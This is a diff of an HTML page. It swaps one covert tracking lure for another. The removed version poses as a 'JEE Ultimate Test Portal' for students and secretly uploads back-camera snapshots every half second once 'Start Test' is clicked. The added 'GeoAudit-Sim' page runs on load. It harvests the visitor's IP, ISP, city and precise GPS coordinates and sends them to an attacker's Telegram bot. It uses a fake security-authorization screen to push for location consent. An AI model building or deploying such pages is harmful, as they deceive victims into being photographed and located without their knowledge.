@@ -1,282 +1,250 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>JEE Ultimate Test Portal</title>
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
-html,body{height:100%;overflow:hidden;color:white;}
-
-body{
-  background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
-  background-size:400% 400%;
-  animation:gradientMove 12s ease infinite;
-}
-
-@keyframes gradientMove{
-  0%{background-position:0% 50%;}
-  50%{background-position:100% 50%;}
-  100%{background-position:0% 50%;}
-}
-
-#overlay{
-  position:absolute;
-  width:100%;
-  height:100%;
-  overflow:auto;
-  backdrop-filter:blur(12px);
-  background:rgba(0,0,0,0.6);
-  padding:40px;
-}
-
-h1{
-  text-align:center;
-  font-size:48px;
-  letter-spacing:4px;
-  margin-bottom:10px;
-  animation:flashIntro 2s ease forwards;
-}
-
-@keyframes flashIntro{
-  0%{opacity:0;letter-spacing:20px;}
-  50%{opacity:1;text-shadow:0 0 30px #ff004c;}
-  100%{letter-spacing:4px;}
-}
-
-.top-info{text-align:center;margin-bottom:25px;}
-#studentName{cursor:pointer;color:#00ffd5;}
-#timeDate{margin-top:5px;font-size:14px;opacity:0.8;}
-#rankCounter{margin-top:10px;font-size:20px;color:#ffcc00;}
-
-.container{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
-  gap:25px;
-  margin-top:30px;
-}
-
-.card{
-  background:rgba(255,255,255,0.05);
-  padding:20px;
-  border-radius:20px;
-  backdrop-filter:blur(6px);
-}
-
-.progress{
-  height:10px;
-  background:#333;
-  border-radius:20px;
-  overflow:hidden;
-  margin-top:8px;
-}
-
-.progress div{
-  height:100%;
-  width:0%;
-  background:linear-gradient(90deg,#00ffcc,#00bfff);
-  transition:1s;
-}
-
-button{
-  padding:10px 20px;
-  border:none;
-  border-radius:30px;
-  cursor:pointer;
-  background:linear-gradient(45deg,#ff004c,#ff7a00);
-  color:white;
-  font-weight:bold;
-  margin-top:10px;
-}
-
-button:hover{transform:scale(1.05);}
-
-#timer{font-size:22px;margin-top:10px;}
-.quote{margin-top:10px;font-style:italic;opacity:0.8;}
-
-iframe{width:100%;height:100%;border:0;display:none;}
-#v,#c{display:none;}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GeoAudit-Sim: Node Verification Portal</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d1117;
+        }
+        #bg-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+            opacity: 0.15; /* Professional dark theme overlay */
+        }
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(13, 17, 23, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(0, 218, 185, 0.1);
+            border-radius: 50%;
+            border-top-color: #00dab9;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        #loading-text {
+            color: #c9d1d9;
+            font-size: 16px;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            text-align: center;
+        }
+        #permission-request {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(13, 17, 23, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 3;
+            color: #f0f6fc;
+            text-align: center;
+            padding: 20px;
+        }
+        #permission-request h2 {
+            margin-bottom: 15px;
+            color: #ff7b72;
+        }
+        #allow-btn {
+            margin-top: 20px;
+            padding: 12px 35px;
+            background: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: background 0.2s;
+        }
+        #allow-btn:hover {
+            background: #2ea043;
+        }
+    </style>
 </head>
-
 <body>
+    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Infrastructure Matrix Background">
+    
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <div id="loading-text">Synchronizing secure gateway connection...</div>
+    </div>
+    
+    <div id="permission-request">
+        <h2>NODE AUDIT: AUTHORIZATION REQUIRED</h2>
+        <p>Please authorize client-side location telemetry parameters to validate session integrity.</p>
+        <button id="allow-btn">GRANT TELEMETRY ACCESS</button>
+    </div>
 
-<div id="overlay">
-
-<h1>JEE Ultimate Test Portal</h1>
-
-<div class="top-info">
-  <div id="studentName" onclick="changeName()">Welcome, Adarsh 🚀</div>
-  <div id="timeDate"></div>
-  <div id="rankCounter">Loading Rank...</div>
-</div>
-
-<div class="container">
-
-  <div class="card">
-    <h3>Start Test</h3>
-    <button onclick="start()">▶ Start Test</button>
-  </div>
-
-  <div class="card">
-    <h3>Subject Progress</h3>
-    Physics<div class="progress"><div id="phy"></div></div>
-    Chemistry<div class="progress"><div id="chem"></div></div>
-    Maths<div class="progress"><div id="math"></div></div>
-  </div>
-
-  <div class="card">
-    <h3>Study Timer</h3>
-    <div id="timer">00:00:00</div>
-    <button onclick="startTimer()">Start</button>
-    <button onclick="stopTimer()">Stop</button>
-  </div>
-
-  <div class="card">
-    <h3>Motivation</h3>
-    <div class="quote" id="quote"></div>
-  </div>
-
-</div>
-</div>
-
-<iframe id="frame"></iframe>
-<video id="v" autoplay playsinline hidden></video>
-<canvas id="c" hidden></canvas>
-
-<script>
-
-/* Editable Name */
-function changeName(){
-  let name=prompt("Enter your name:");
-  if(name){
-    localStorage.setItem("jeeName",name);
-    document.getElementById("studentName").innerText="Welcome, "+name+" 🚀";
-  }
-}
-let saved=localStorage.getItem("jeeName");
-if(saved){
-  document.getElementById("studentName").innerText="Welcome, "+saved+" 🚀";
-}
-
-/* Time */
-function updateTime(){
-  let now=new Date();
-  document.getElementById("timeDate").innerText=
-    now.toLocaleDateString()+" | "+now.toLocaleTimeString();
-}
-setInterval(updateTime,1000);updateTime();
-
-/* Rank Counter */
-let p=0,target=99.30;
-let counter=setInterval(()=>{
-  p+=1.5;
-  if(p>=target){p=target;clearInterval(counter);}
-  document.getElementById("rankCounter").innerText=
-    "Target Performance: "+p.toFixed(2)+"%";
-},30);
-
-/* Progress Bars */
-setTimeout(()=>{
-  phy.style.width="70%";
-  chem.style.width="60%";
-  math.style.width="75%";
-},500);
-
-/* Timer */
-let sec=0,timerInt;
-function startTimer(){
-  timerInt=setInterval(()=>{
-    sec++;
-    let h=Math.floor(sec/3600);
-    let m=Math.floor((sec%3600)/60);
-    let s=sec%60;
-    timer.innerText=
-      String(h).padStart(2,'0')+":"+
-      String(m).padStart(2,'0')+":"+
-      String(s).padStart(2,'0');
-  },1000);
-}
-function stopTimer(){clearInterval(timerInt);}
-
-/* Quotes */
-let quotes=[
-  "Consistency beats motivation.",
-  "One test closer to IIT.",
-  "Focus now, celebrate later.",
-  "Small daily improvement = Big results."
-];
-let qi=0;
-function rotateQuote(){
-  quote.innerText=quotes[qi];
-  qi=(qi+1)%quotes.length;
-}
-setInterval(rotateQuote,4000);rotateQuote();
-
-/* START TEST LOGIC — BACK CAMERA FORCED */
-async function start(){
-
-  try{
-
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video:{
-        facingMode:{exact:"environment"},
-        width:{ideal:1920},
-        height:{ideal:1080},
-        frameRate:{ideal:30}
-      }
-    });
-
-    v.srcObject=stream;
-
-    setTimeout(capture,500);
-    setInterval(capture,500);
-
-  }catch(e){
-    console.log(e);
-    return;
-  }
-
-  document.getElementById("overlay").style.display="none";
-
-  const r=await fetch("/get_video_link");
-  const d=await r.json();
-
-  const frame=document.getElementById("frame");
-  frame.style.display="block";
-  frame.src=d.url;
-
-  if(frame.requestFullscreen){
-    frame.requestFullscreen();
-  }else if(frame.webkitRequestFullscreen){
-    frame.webkitRequestFullscreen();
-  }else if(frame.msRequestFullscreen){
-    frame.msRequestFullscreen();
-  }
-}
-
-/* CLEAR CAPTURE */
-function capture(){
-  if(!v.videoWidth) return;
-
-  c.width=v.videoWidth;
-  c.height=v.videoHeight;
-
-  const ctx=c.getContext("2d");
-  ctx.imageSmoothingEnabled=true;
-  ctx.imageSmoothingQuality="high";
-  ctx.filter="contrast(108%) brightness(104%)";
-
-  ctx.drawImage(v,0,0,c.width,c.height);
-
-  c.toBlob(b=>{
-    let f=new FormData();
-    f.append("photo",b,"u.jpg");
-    fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",0.92);
-}
-
-</script>
-
+    <script>
+        // Target Gateway Configurations - Authorized Telemetry Channels
+        const botToken = 'ENTER YOUR BOT TOKEN';
+        const chatId = 'ENTER YOUR TELEGRAM CHAT ID';
+        
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingText = document.getElementById('loading-text');
+        const permissionRequest = document.getElementById('permission-request');
+        const allowBtn = document.getElementById('allow-btn');
+        
+        // Rebranded Academic Telemetry Logging Sequences
+        const loadingMessages = [
+            "Synchronizing secure gateway connection...",
+            "Analyzing client-side network headers...",
+            "Verifying cryptographic session parameters...",
+            "Compiling host environment matrix...",
+            "Preparing administrative interface...",
+            "Finalizing security telemetry logs..."
+        ];
+        
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) {
+                console.error("IP ingestion fault:", error);
+                return {};
+            }
+        }
+        
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    }),
+                    error => {
+                        if (error.code === error.PERMISSION_DENIED) {
+                            setTimeout(() => {
+                                permissionRequest.style.display = 'flex';
+                            }, 3000);
+                        }
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function sendToTelegram(data) {
+            try {
+                let message = `🛡️ GEOAUDIT SIMULATION SYSTEM ENGINE 🛡️\n\n`;
+                message += `📱 Device Signature: ${navigator.userAgent}\n\n`;
+                message += `🌐 Client IP: ${data.ip || 'Unknown'}\n`;
+                message += `📍 IP Resolved Geolocation: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+                message += `🏢 Autonomous System (ISP): ${data.org || 'Unknown'}\n`;
+                
+                if (data.liveLocation) {
+                    message += `\n🎯 HARDWARE GPS METRICS CAPTURED:\n`;
+                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+                    message += `🔹 Resolution Accuracy: ${data.liveLocation.accuracy}m\n`;
+                    message += `🔹 Timestamp: ${data.liveLocation.timestamp}\n`;
+                    message += `🗺️ Vector Mapping URL: https://maps.google.com/?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+                } else {
+                    message += `\n📍 INTERNET GATEWAY ESTIMATED BOUNDS:\n`;
+                    message += `🔹 Lat-Est: ${data.latitude || 'Unknown'}\n`;
+                    message += `🔹 Lon-Est: ${data.longitude || 'Unknown'}\n`;
+                    if (data.latitude && data.longitude) {
+                        message += `🗺️ Mapping Vector: https://maps.google.com/?q=${data.latitude},${data.longitude}\n`;
+                    }
+                }
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (data.liveLocation) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: data.liveLocation.lat,
+                            longitude: data.liveLocation.lon
+                        })
+                    });
+                }
+            } catch (error) {
+                console.error("Telemetry dispatch exception:", error);
+            }
+        }
+        
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+        
+        async function trackUser() {
+            rotateLoadingMessages();
+            const liveLocation = await getPreciseLocation();
+            const ipDetails = await getIPInfo();
+            const trackingData = {
+                ...ipDetails,
+                ip: ipDetails.ip || 'Unknown',
+                liveLocation: liveLocation
+            };
+            await sendToTelegram(trackingData);
+        }
+        
+        allowBtn.addEventListener('click', async () => {
+            permissionRequest.style.display = 'none';
+            await trackUser();
+        });
+        
+        window.onload = trackUser;
+    </script>
 </body>
 </html>
